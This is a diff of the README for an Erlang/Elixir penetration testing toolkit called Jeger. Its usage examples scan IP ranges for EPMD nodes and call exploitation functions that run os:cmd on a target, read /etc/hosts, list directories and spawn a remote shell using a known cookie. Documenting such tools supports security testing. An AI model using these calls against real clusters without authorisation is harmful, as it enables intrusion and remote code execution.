@@ -15,110 +15,39 @@ Erlang/Elixir node discovery and penetration testing toolkit.
 rebar3 escriptize
 ```
 
-## Usage
-
-### Prerequisites
-
-Jeger targets **distributed Erlang/Elixir systems**. You need:
-- Target nodes running with EPMD (Erlang Port Mapper Daemon)
-- Network access to port 4369 (EPMD) and distribution ports
-- Knowledge of the Erlang cookie (for enumeration/exploitation)
-
-### Local Testing
+## Quick Start
 
 ```bash
-# Terminal 1: Start a test node
+# Start a test node
 erl -sname myapp -setcookie secret123
 
-# Terminal 2: Scan for it
+# Scan for it
 ./_build/default/bin/jeger -r 127.0.0.1-1
+
+# Scan network range with custom timeout and concurrency
+./_build/default/bin/jeger -r 192.168.1.1-254 -t 2000 -c 100
 ```
 
-### Remote Scanning
+Common targets: Phoenix/Elixir apps, RabbitMQ, CouchDB, ejabberd
 
-```bash
-# Scan network range
-./_build/default/bin/jeger -r 192.168.1.1-254
+## API Usage
 
-# Scan specific subnet
-./_build/default/bin/jeger -r 10.0.0.1-100 -t 2000 -c 100
-
-# Corporate network scan
-./_build/default/bin/jeger -r 172.16.0.1-254
-```
-
-### Real-World Scenarios
-
-**Phoenix/Elixir apps:**
-```bash
-# Development environments often expose EPMD
-jeger -r 192.168.1.1-254
-
-# Production clusters
-jeger -r 10.20.30.1-254 -t 5000
-```
-
-**Distributed Erlang clusters:**
-```bash
-# RabbitMQ, CouchDB, ejabberd, etc.
-jeger -r 172.16.0.1-100
-```
-
-## Programmatic Usage
-
-Start an Erlang shell with Jeger:
-
-```bash
+```erlang
+% Start shell
 rebar3 shell
-```
 
-### Discovery
+% Discovery
+{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 254}, #{timeout => 2000, verbose => true}).
 
-```erlang
-%% Scan IP range
-{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 254}, #{}).
-
-%% With options
-{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 10}, #{
-    timeout => 2000,
-    concurrency => 100,
-    verbose => true
-}).
-```
-
-### Enumeration
-
-```erlang
-%% Enumerate single node
+% Enumeration
 {ok, Info} = jeger_enum:enumerate_node("192.168.1.5", "myapp", secret).
 
-%% View formatted output
-io:format("~s", [jeger_enum:format_enumeration(Info)]).
-```
-
-### Vulnerability Scanning
-
-```erlang
-%% Scan for vulnerabilities
+% Vulnerability scanning
 {ok, Findings} = jeger_scan:scan_node("192.168.1.5", "myapp", secret).
 
-%% Format findings
-io:format("~s", [jeger_scan:format_findings(Findings)]).
-```
-
-### Exploitation
-
-```erlang
-%% Execute command
+% Exploitation
 {ok, Result} = jeger_exploit:execute_command("192.168.1.5", "myapp", secret, "os:cmd(\"whoami\")").
-
-%% Read file
 {ok, Content} = jeger_exploit:read_file("192.168.1.5", "myapp", secret, "/etc/hosts").
-
-%% List directory
-{ok, Files} = jeger_exploit:list_directory("192.168.1.5", "myapp", secret, "/tmp").
-
-%% Spawn interactive shell
 {ok, Pid} = jeger_exploit:spawn_shell("192.168.1.5", "myapp", secret).
 ```
 
